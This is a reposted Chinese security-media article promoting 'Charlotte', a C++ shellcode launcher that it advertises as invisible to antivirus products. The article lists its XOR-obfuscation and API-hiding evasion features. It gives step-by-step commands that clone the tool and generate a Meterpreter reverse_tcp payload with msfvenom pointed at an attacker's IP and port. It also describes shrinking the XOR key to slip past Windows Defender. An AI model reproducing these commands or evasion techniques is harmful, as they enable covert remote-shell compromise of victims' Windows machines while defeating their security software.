> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Ajh0zgmTZbvxwU_EOXFtrg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39zDym7ziaia2miaYIhvEW6Psb7kvxY4plvCE32zLMOGZZHb5niaaiaGoQo0dHhpicTiaWoLRqLOZ7Sbgm3A/640?wx_fmt=jpeg)

关于 Charlotte
------------

Charlotte 是一款基于 C++ 实现的 Shellcode 启动器，并且完全不会被安全解决方案所检测到。

工具特性
----

截止至 2021 年 5 月 13 日之前，该工具的检测结果为 0/26；

该工具支持动态调用 Win32 API 函数；

对 Shellcode 和函数名进行异或加密；

每次运行随机化异或密钥和变量；

在 Kali Linux 上，只需运行 “apt-get install mingw-w64*” 即可；

支持随机字符串长度和异或密钥长度；

antiscan.me
-----------

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39zDym7ziaia2miaYIhvEW6PsbWYgE0YKdeCQw9bianGeCnHp6sWf2cGnHz07UxXd3ribVUfj1fia1oOEQw/640?wx_fmt=jpeg)

工具使用
----

首先，我们需要使用 git clone 命令将该项目源码克隆至本地，并使用脚本工具生成 Shellcode 文件。具体操作示例如下：

```
git clone https://github.com/9emin1/charlotte.git && apt-get install mingw-w64*

cd charlotte

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$YOUR_IP LPORT=$YOUR_PORT -f raw > beacon.bin

python charlotte.py

```

使用 msfvenom -p 测试以及 Cobalt Strike 原始格式 Payload
----------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR39zDym7ziaia2miaYIhvEW6PsbnK3yIzPGO0NhyCZewn3UMp0D0rRYF3iar6TeeDWJib4sNK4F1CCpmy4w/640?wx_fmt=gif)

强化功能
----

很明显，Windows Defender 是能够检测到. DLL 代码的，但我们在 POC 中通过将 16 字节大小的异或密钥降低至 9 个字节，就可以规避检测了。

项目地址
----

Charlotte：【点击阅读原文】

![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR38Tm7G07JF6t0KtSAuSbyWtgFA8ywcatrPPlURJ9sDvFMNwRT0vpKpQ14qrYwN2eibp43uDENdXxgg/640?wx_fmt=gif)

![](http://mmbiz.qpic.cn/mmbiz_png/3Uce810Z1ibJ71wq8iaokyw684qmZXrhOEkB72dq4AGTwHmHQHAcuZ7DLBvSlxGyEC1U21UMgSKOxDGicUBM7icWHQ/640?wx_fmt=png&wxfrom=200) 交易担保 FreeBuf+ FreeBuf + 小程序：把安全装进口袋 小程序

  

精彩推荐

  

  

  

  

****![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib2xibAss1xbykgjtgKvut2LUribibnyiaBpicTkS10Asn4m4HgpknoH9icgqE0b0TVSGfGzs0q8sJfWiaFg/640?wx_fmt=jpeg)****

  

[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39cpPZAJWAzWjEQtKT2aO8ljsMhAvRdXgZIWNnyfHYhgBDFM7574D04oob78kxeocbSAl9GzNYibzA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651125480&idx=2&sn=1af44d66d0b2e445439e99bff2c2c0db&chksm=bd1f64638a68ed75dbdf9d3f04545f80f68a6d198693361470e9163d112b8f2385ce66583754&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39sqjaLlJOnNYV4AEasAdibTzrH7PyIuE8MbnS21dOWVXNguibdAWFTQSXMxjy2GSJodYHLFhQ1ficDQ/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247486112&idx=1&sn=296cf1bc4e88502ec3c5f73199949135&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39dEsdO2GpOvH87GrfzuscAMuA4JpicWAFbJtfakgMF2hheeTcSSwguAbjO45btx8ws2etnvSJlOzQ/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247486070&idx=1&sn=c6957ca2d1878f316b7947b5ff990a01&chksm=ce1cf0e9f96b79fff5b27a3c146f9e8828728c33625a97366b0cae3df1853dbeda368c59177f&scene=21#wechat_redirect)

**************![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR3icF8RMnJbsqatMibR6OicVrUDaz0fyxNtBDpPlLfibJZILzHQcwaKkb4ia57xAShIJfQ54HjOG1oPXBew/640?wx_fmt=gif)**************